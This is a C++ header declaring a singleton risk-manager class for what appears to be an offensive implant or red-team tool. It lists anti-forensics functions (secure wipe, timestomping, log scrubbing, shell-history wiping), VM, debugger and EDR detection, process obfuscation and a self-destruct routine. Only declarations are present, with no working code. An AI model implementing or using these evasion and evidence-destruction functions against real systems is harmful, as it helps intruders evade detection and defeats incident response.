#pragma once

#include <string>
#include <vector>
#include <filesystem>
#include <mutex>

namespace interlock {

enum class RiskLevel {
    MINIMAL,
    LOW,
    MEDIUM,
    HIGH,
    CRITICAL
};

struct OpsecStatus {
    float risk_score;
    RiskLevel level;
    bool is_vm;
    bool is_debugged;
    std::vector<std::string> detected_edr;
};

class RiskManager {
public:
    static RiskManager& getInstance() {
        static RiskManager instance;
        return instance;
    }

    // --- Anti-Forensics (Native C++ Implementation) ---
    void secureWipe(const std::filesystem::path& path, int passes = 3);
    void timestomp(const std::filesystem::path& target, const std::filesystem::path& reference = "");
    void scrubLogs();
    void wipeShellHistory();

    // --- Anti-Analysis ---
    bool detectAnalysisEnv();
    bool checkAntiDebugging();
    std::vector<std::string> detectEDR();

    // --- Process Obfuscation ---
    void obfuscateProcess(const std::string& new_name);

    // --- Integrity Level ---
    void setStealthLevel(int level);

    // --- Risk Management ---
    OpsecStatus getStatus();
    void reportDeviation(const std::string& agent, const std::string& desc, int impact);
    void triggerSelfDestruct(const std::string& reason);
    void induceCrash(bool gpu = false);

private:
    RiskManager();
    std::mutex mtx;
    float behavioral_risk_score = 0.0f;

    void updateHardwareAgnosticIndicators();
};

} // namespace interlock
